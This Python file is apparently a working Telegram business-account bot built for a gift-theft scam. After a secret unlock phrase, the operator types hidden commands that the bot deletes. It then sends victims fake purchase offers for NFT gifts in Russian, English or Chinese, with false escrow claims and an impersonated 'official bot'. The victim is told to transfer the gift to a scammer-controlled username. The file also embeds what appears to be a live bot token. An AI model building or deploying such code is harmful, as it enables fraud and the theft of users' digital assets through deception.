import re
import asyncio
import logging
import os
import aiohttp
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ==========================================
BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
# ==========================================

RENDER_URL = "https://portals-ams5.onrender.com" 
SECRET_KEY = "/unlock_8f3k2m9x" 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

AUTHORIZED_USERS = set()

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_URL) as response:
                    pass
        except Exception:
            pass
        await asyncio.sleep(600)

# --- ЛОКАЛИЗАЦИЯ (СЛОВАРИ ТЕКСТОВ) ---
TEXTS = {
    "ru": {
        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n<a href='{nft_link}'></a>",
        "btn_show": "ПОКАЗАТЬ ПОДАРОК",
        "btn_decline": "Отклонить",
        "btn_accept": "Принять",
        "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
        "btn_transfer": "Передать NFT"
    },
    "en": {
        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n<a href='{nft_link}'></a>",
        "btn_show": "SHOW GIFT",
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "accepted": "<b>The buyer has reserved your gift.</b>\n\n<blockquote>Funds are held in a special escrow account and will be credited to the balance after the gift is transferred.\n\n<b>To complete the deal:</b>\n1. Transfer the gift to the official bot: {transfer_bot}\n2. Click 'Transfer NFT' and select the NFT.\n3. Confirm the transfer of the gift.\n\nTelegram will record the transaction and instantly credit {price} to your account.\n\n<b>The reservation is valid for 24 hours.</b></blockquote>",
        "btn_transfer": "Transfer NFT"
    },
    "zh": {
        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n<a href='{nft_link}'></a>",
        "btn_show": "显示礼物",
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "accepted": "<b>买家已预订您的礼物。</b>\n\n<blockquote>资金存放在特殊的托管账户中，将在礼物转移后记入余额。\n\n<b>完成交易：</b>\n1. 将礼物转移给官方机器人：{transfer_bot}\n2. 点击“转移 NFT”并选择 NFT。\n3. 确认礼物转移。\n\nTelegram 将记录交易并立即将 {price} 记入您的账户。\n\n<b>预订有效期为 24 小时。</b></blockquote>",
        "btn_transfer": "转移 NFT"
    }
}

# --- ЛОГИКА БОТА ---
@dp.business_message(F.text == SECRET_KEY)
async def unlock_bot(message: types.Message):
    AUTHORIZED_USERS.add(message.from_user.id)
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass
    await bot.send_message(
        chat_id=message.chat.id,
        text="✅ Бот активирован. Теперь вы можете использовать /price.",
        business_connection_id=message.business_connection_id
    )

# Ловим все три команды
@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
async def handle_price_command(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"Не удалось удалить команду: {e}")

    # Определяем язык
    command = message.text.split()[0].lower()
    if command == "/price":
        lang = "ru"
    elif command == "/prace":
        lang = "en"
    else:
        lang = "zh"
    
    t = TEXTS[lang]

    # Парсим аргументы (ищем после команды)
    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
    match = re.match(pattern, message.text, re.IGNORECASE)
    if not match:
        return

    _, nft_link, price_value, currency, target_user = match.groups()
    currency = currency.lower()

    nft_name_raw = nft_link.split('/')[-1].replace('-', '')
    nft_name_formatted = nft_name_raw.capitalize() 

    # Валюта
    price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"

    # Ссылка на профиль отправителя (для красоты)
    user_link = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>"

    # Формируем текст по шаблону
    final_text = t["offer"].format(
        user_link=user_link, 
        price=price_text, 
        nft_name=nft_name_formatted, 
        nft_link=nft_link
    )

    # Кнопки
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
        [
            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
        ]
    ])

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=final_text,
            business_connection_id=message.business_connection_id,
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке: {e}")

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer()

    try:
        parts = callback.data.split(":")
        price_str = parts[1]
        lang = parts[2]
        
        t = TEXTS[lang]

        transfer_bot = "@portals_nftbot"
        target_username = "portalNftReplayer" 
        gift_link = f"tg://send_gift?to={target_username}"

        # Формируем розовую плашку
        new_text = t["accepted"].format(
            transfer_bot=transfer_bot, 
            price=price_str
        )

        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
        ])

        await bot.edit_message_text(
            text=new_text,
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            reply_markup=new_keyboard,
            business_connection_id=callback.message.business_connection_id
        )
    except Exception as e:
        logging.error(f"Ошибка в кнопке: {e}")
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: types.CallbackQuery):
    lang = callback.data.split(":")[1]
    msg = "Вы отклонили предложение." if lang == "ru" else ("You have declined the offer." if lang == "en" else "您已拒绝该报价。")
    await callback.answer(msg, show_alert=True)

async def main():
    Thread(target=run_flask, daemon=True).start()
    asyncio.create_task(keep_alive()) 
    print("Бот запущен. Ожидание секретного ключа...")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
